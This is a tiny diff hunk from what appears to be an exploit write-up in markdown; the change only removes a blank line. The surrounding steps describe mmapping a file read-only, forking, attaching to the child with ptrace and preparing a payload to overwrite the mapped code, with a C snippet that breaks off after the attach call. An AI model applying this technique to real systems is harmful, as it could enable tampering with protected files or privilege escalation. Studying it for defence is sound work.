@@ -63,7 +63,6 @@ caddr_t addr = mmap(NULL, LEN, PROT_READ, MAP_SHARED, fd, 0);
 2. `fork` to passe to be the mmaped address to a process I can attach to using `ptrace()`
 
 3. in the parent process, I attach to the child process and then prepare a basic payload to substitute the original code with
-
 ```c
 	if (ptrace(PT_ATTACH, pid, 0, 0) < 0) {
 		perror("[-] ptrace(PT_ATTACH) failed");
